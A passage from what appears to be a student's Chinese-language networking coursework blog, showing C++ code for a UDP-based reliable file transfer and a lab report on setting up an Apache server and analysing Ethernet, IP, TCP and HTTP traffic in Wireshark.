class="comment">//打印每条发送报文标志位相关信息，方便观察传输过程，由于IO时间消耗很大，这里注释掉</span></span><br><span class="line">	<span class="comment">//if (a.flag) &#123; cout &lt;&lt; "发送 "; a.print(); &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">simplerecv</span><span class="params">(message&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(a.msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(a.msg));<span class="comment">//初始化全为0，防止收到前面收到消息的影响</span></span><br><span class="line">    <span class="comment">//参数与sendto函数类似，只是第五项的目的IP地址改为源IP地址，即从哪个IP接收消息</span></span><br><span class="line">	recvfrom(sock, (<span class="keyword">char</span>*)&amp;a, <span class="keyword">sizeof</span>(message), <span class="number">0</span>, (struct sockaddr*)&amp;addr, &amp;addr_len);</span><br><span class="line">	<span class="comment">//if (a.flag) &#123; cout &lt;&lt; "接收 "; a.print(); &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>支持用户输入IP</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里仅以一端作为演示</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"是否使用默认IP？是1，否2 "</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line"><span class="keyword">if</span> (i == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> s[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="keyword">char</span> c[<span class="number">20</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入服务器IP: "</span> ;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; s;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入客户端IP: "</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">    addrop.sin_addr.s_addr = inet_addr(s);</span><br><span class="line">    addr.sin_addr.s_addr = inet_addr(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="message类"><a href="#message类" class="headerlink" title="message类"></a>message类</h3><p><strong>初始化</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">message::message() &#123;</span><br><span class="line">	<span class="built_in">memset</span>(<span class="keyword">this</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));<span class="comment">//初始化全0</span></span><br><span class="line">	SendPort = SPORT;<span class="comment">//这里以server端为例</span></span><br><span class="line">	RecvPort = CPORT;</span><br><span class="line">	SendIP = addr.sin_addr.s_addr;</span><br><span class="line">	RecvIP = addrop.sin_addr.s_addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="标志位的获取与设置"><a href="#标志位的获取与设置" class="headerlink" title="标志位的获取与设置"></a>标志位的获取与设置</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">message::get_syn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;flag &amp; <span class="number">0x02</span>)<span class="comment">//flag的右第二位是0还是1</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message::set_ack</span><span class="params">(message b)</span><span class="comment">//ack需要指明是对哪条消息的确认</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (get_ack() == <span class="number">0</span>)</span><br><span class="line">		flag += <span class="number">0x01</span>;<span class="comment">//一个标识位只需要1bit</span></span><br><span class="line">	<span class="keyword">this</span>-&gt;ackseq = b.msgseq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">message::set_syn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (get_syn() == <span class="number">0</span>)</span><br><span class="line">		flag += <span class="number">0x02</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="消息处理流程"><a href="#消息处理流程" class="headerlink" title="消息处理流程"></a>消息处理流程</h3><h4 id="server："><a href="#server：" class="headerlink" title="server："></a>server：</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    message b;</span><br><span class="line">    simplerecv(b);</span><br><span class="line">    <span class="keyword">if</span> (b.get_exist())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!tackle(b))<span class="keyword">break</span>;<span class="comment">//对收到的消息b进行处理，当server端选择退出时时返回0</span></span><br><span class="line">    &#125;</span><br><span class="line">    Sleep(<span class="number">20</span>);<span class="comment">//防止频繁接收空消息占用大量CPU资源</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tackle</span><span class="params">(message b)</span><span class="comment">//处理收到的报文</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (b.get_syn())<span class="comment">//如果b中包含syn，则执行建立连接相关部分</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (buildconnectionSer(b))</span><br><span class="line">		&#123;</span><br><span class="line">			status = <span class="number">1</span>;<span class="comment">//设置状态</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"建立连接"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"连接建立失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (b.get_startfile())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (status)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"开始接收文件"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			recvfile(b);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"请先建立连接"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (b.get_fin())<span class="comment">//如果client请求断开连接</span></span><br><span class="line">	&#123;<span class="comment">//这里可能出现双方状态不一致的情况，所以server端支持所有状态下的断开连接请求</span></span><br><span class="line">			<span class="keyword">if</span> (byeser(b)) </span><br><span class="line">        	&#123;</span><br><span class="line">				status = <span class="number">0</span>;</span><br><span class="line">				sendseq = <span class="number">0</span>;<span class="comment">//发送序号重置</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"未连接"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"对方已经断开连接，是否结束程序？0退出，1不退出 "</span>;</span><br><span class="line">            <span class="keyword">int</span> i;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; i;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="client"><a href="#client" class="headerlink" title="client"></a>client</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"请选择操作：传输文件1，退出0 "</span> &lt;&lt; <span class="built_in">endl</span>;<span class="comment">//用户进行操作选择</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op != <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"无效操作"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">1</span>)</span><br><span class="line">    &#123;<span class="comment">//选择发送文件</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入文件名 "</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">30</span>] = &#123;&#125;;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; name;</span><br><span class="line">        <span class="comment">//建立连接，发送文件，断开连接</span></span><br><span class="line">        <span class="keyword">if</span> (buildconnectionCli())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (sendfile(name))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"文件发送成功"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"文件发送失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"连接建立失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (byecli())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"连接已断开"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">            sendseq = <span class="number">0</span>;<span class="comment">//发送序号置零</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">"连接断开失败"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sendseq = <span class="number">0</span>;<span class="comment">//发送序号置零</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>大三上学期课程内容</tag>
        <tag>socket</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络作业2 Web服务器配置，HTTP报文捕获</title>
    <url>/2021/01/15/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E4%BD%9C%E4%B8%9A2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="计算机网络第二次实验作业——Web服务器配置，HTTP报文捕获"><a href="#计算机网络第二次实验作业——Web服务器配置，HTTP报文捕获" class="headerlink" title="计算机网络第二次实验作业——Web服务器配置，HTTP报文捕获"></a>计算机网络第二次实验作业——Web服务器配置，HTTP报文捕获</h1><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>（1）搭建Web服务器（自由选择系统），并制作简单Web页面，包含简单文本信息（至少包含专业、学号、姓名）。</p>
<p>（2）通过浏览器获取自己编写的Web页面，使用Wireshark捕获与Web服务器的交互过程，并进行简单分析说明。</p>
<h2 id="Web服务器的搭建"><a href="#Web服务器的搭建" class="headerlink" title="Web服务器的搭建"></a>Web服务器的搭建</h2><ul>
<li>系统：windows xp 虚拟机</li>
<li>软件：apache（phpnow）</li>
<li>虚拟机IP：192.168.141</li>
<li>端口：默认端口80</li>
<li>访问方式：主机浏览器访问虚拟机ip</li>
</ul>
<p>安装软件后，在安装路径<code>C:\phpnow\htdocs\</code>下添加页面，本次实验所需的html文件将统一放置在<code>netword</code>子路径下</p>
<p>具体代码内容将在下一部分（数据包捕获）详述</p>
<h2 id="通过Wireshark捕获与Web服务器的交互过程"><a href="#通过Wireshark捕获与Web服务器的交互过程" class="headerlink" title="通过Wireshark捕获与Web服务器的交互过程"></a>通过Wireshark捕获与Web服务器的交互过程</h2><h3 id="网页访问概览"><a href="#网页访问概览" class="headerlink" title="网页访问概览"></a>网页访问概览</h3><p>打开Wireshark，选择需要捕获的网卡，这里由于是使用NAT模式下的虚拟机搭建的服务器，所以选用VMnet8</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112000608600.png"  alt="image-20201112000608600"></p>
<p>为了观察连接的建立和页面访问的基本过程，使用一个空的文件<code>1.html</code></p>
<p>访问</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112000822612.png"  alt="image-20201112000822612" style="zoom:67%;">

<p>可以看到Wireshark捕获到的内容。</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112002522787.png"  alt="image-20201112002522787"></p>
<p>界面大致分为四个区：命令菜单区、俘获分组列表区、选定分组首部细节区、十六进制和ASCII格式分组内容区。</p>
<p>其中，命令菜单区的<strong>应用显示过滤器</strong>部分可以筛选显示的分组，例如<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112003005490.png"  alt="image-20201112003005490" style="zoom:50%;">可以查找TCP协议下包含80端口的消息；<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112003134094.png"  alt="image-20201112003134094" style="zoom:50%;">能够找到在<code>source</code>或<code>destination</code>中包含该ip的消息，由于没有使用127.0.0.1，所以查找结果为空</p>
<h4 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h4><p>对于第一条消息，为TCP原型</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112101752125.png"  alt="image-20201112101752125"></p>
<p>消息分为4个部分<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112110037185.png"  alt="image-20201112110037185"></p>
<ol>
<li><strong>Frame</strong>，指的是==物理层的数据帧概况==</li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112102947805.png"  alt="image-20201112102947805"></p>
<ol start="2">
<li><strong>Ethernet II</strong>，<strong>第0-13个字节</strong>，表示数据层以太网帧头部信息，包含<strong>目的地址</strong>、<strong>源地址</strong>和<strong>协议类型</strong></li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112102623867.png"  alt="image-20201112102623867"></p>
<p><strong>源地址</strong>为00:50:56:c0:00:08<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112101551631.png"  alt="image-20201112101551631" style="zoom:80%;">在数据包的<strong>第6-11字节</strong>表示发送端的物理地址，看到是主机网卡中的信息，源ip信息与源网卡信息相对应，可以看到是<strong>主机向“服务器”发送的网络请求</strong></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112102042908.png"  alt="image-20201112102042908" style="zoom:80%;">

<p><strong>目的地址</strong>为00:0c:29:8d:b9:51<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112102207944.png"  alt="image-20201112102207944"></p>
<p>在数据包的<strong>前六个字节</strong>，是虚拟机对应的网卡，表示消息<strong>发送至虚拟机网卡</strong></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112102333147.png"  alt="image-20201112102333147"></p>
<p><strong>协议类型</strong>为<strong>IPV4</strong>，用<strong>0x0800</strong>表示<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112102748946.png"  alt="image-20201112102748946" style="zoom: 67%;"></p>
<p>整体格式符合定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(1)<span class="comment">//以1byte方式对齐</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">FrameHeader_t</span> &#123;</span><span class="comment">//帧首部</span></span><br><span class="line">	BYTE DesMAC[<span class="number">6</span>];<span class="comment">//6字节目的地址</span></span><br><span class="line">	BYTE SrcMAC[<span class="number">6</span>];<span class="comment">//6字节源地址</span></span><br><span class="line">	WORD FrameType;<span class="comment">//帧类型，解析时注意大小端转换</span></span><br><span class="line">&#125;frameHeader_t;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>Internet Protocol Version 4</strong>，<strong>第14-33个字节</strong>，互联网层IP包头部信息</li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112103627730.png"  alt="image-20201112103627730"></p>
<p>对应内容为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">IPHeader_t</span> &#123;</span><span class="comment">//IP首部</span></span><br><span class="line">	BYTE Ver_HLen;</span><br><span class="line">	BYTE TOS;</span><br><span class="line">	WORD TotalLen</span><br><span class="line">	WORD ID;</span><br><span class="line">	WORD Flag_Segment</span><br><span class="line">	BYTE TTL;</span><br><span class="line">	BYTE Protocol;</span><br><span class="line">	WORD Checksum;<span class="comment">//校验和</span></span><br><span class="line">	ULONG SrcIP;<span class="comment">//源ip地址</span></span><br><span class="line">	ULONG DstIP;<span class="comment">//目的ip地址</span></span><br><span class="line">&#125;IPHeader_t;</span><br></pre></td></tr></table></figure>

<p>例如源IP地址为192.168.89.1，以十六进制显示在消息中为c0.a8.59.01<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112103816676.png"  alt="image-20201112103816676"></p>
<ol start="4">
<li><strong>Transmission Control Protocol</strong>，<strong>第34个字节开始</strong>，传输层的数据段头部信息</li>
</ol>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112100332215.png"  alt="image-20201112100332215"></p>
<p>可以看到，消息是由主机的3164端口发送至虚拟机的80端口</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112105805846.png"  alt="image-20201112105805846"></p>
<h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>选取一条HTTP消息<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112110358970.png"  alt="image-20201112110358970"></p>
<p>消息格式为<strong>在原有TCP格式的基础上</strong>，增加超文本传输协议部分</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112110445800.png"  alt="image-20201112110445800"></p>
<p>可以看到十六进制的消息和对应的字符</p>
<h4 id="连接的建立与断开"><a href="#连接的建立与断开" class="headerlink" title="连接的建立与断开"></a>连接的建立与断开</h4><ul>
<li>找到IP对应的mac地址</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112174406594.png"  alt="image-20201112174406594"></p>
<p>broadcast为设置目的地址为全1（十六进制下的全f），类型为ARP，用0x0806表示</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112174602374.png"  alt="image-20201112174602374" style="zoom:50%;">

<p>目的地址全零表示未知地址</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112174855066.png"  alt="image-20201112174855066" style="zoom:50%;">

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112174419537.png"  alt="image-20201112174419537"></p>
<p>主机向虚拟机回复ip地址对应的MAC</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112175136403.png"  alt="image-20201112175136403" style="zoom:50%;">

<ul>
<li>三次握手</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112172547597.png"  alt="image-20201112172547597"></p>
<p>由第7条消息可以看到，采用的是HTTP/1.1，使用双端口进行连接，防止头阻塞</p>
<p>对于每个端口，由主机向服务器发送连接建立请求SYN，服务器向主机回复SYN消息并携带确认消息ACK，主机收到服务器的回复并再次向服务器发送ACK</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/701983-20180314102251716-1929749101.png"  alt="img" style="zoom: 67%;">

<ul>
<li>四次挥手</li>
</ul>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112172915542.png"  alt="image-20201112172915542"></p>
<p>同样，使用双端口，对于每个端口有以下过程</p>
<ol>
<li>主机向服务器发送连接断开请求，服务器回复确认，</li>
<li>服务器关闭与服务器的连接，并发送FIN和ACK。客户端收到消息，回复确认</li>
</ol>
<h3 id="获取网页文字信息"><a href="#获取网页文字信息" class="headerlink" title="获取网页文字信息"></a>获取网页文字信息</h3><p> 网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>Michelle<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>1811494 刘旭萌 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        信息安全专业</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112154539585.png"  alt="image-20201112154539585"></p>
<p>使用过滤器进行查找<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112154559243.png"  alt="image-20201112154559243"></p>
<p>在这个区找到我们写的html内容，可以看到我们的文件一共由九行，与上述代码相对应<img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112154649040.png"  alt="image-20201112154649040"></p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112154757917.png"  alt="image-20201112154757917" style="zoom: 50%;">

<p>中文由<code>\xxx</code>八进制编码显示，在字符区由16进制表示，例如使用URL解码工具</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112160423104.png"  alt="image-20201112160423104" style="zoom: 80%;">



<h3 id="获取图片信息"><a href="#获取图片信息" class="headerlink" title="获取图片信息"></a>获取图片信息</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Michelle<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1811494 刘旭萌 <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">/1.jpg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112173222234.png"  alt="image-20201112173222234" style="zoom: 33%;">

<p>利用GET请求图片文件，</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/%E5%A4%A7%E4%B8%89%E4%B8%8A/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BD%9C%E4%B8%9A/image-20201112200512027.png"  alt="image-20201112200512027"></p>
<p>返回状态码200代表请求成功，同时返回图片内容（43号消息）</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112201105459.png"  alt="image-20201112201105459">

<p>与图片的16进制编码进行比对，证明是图片内容</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/大三上/计网/计网第二次作业/image-20201112201157687.png"  alt="image-20201112201157687" style="zoom:80%;">



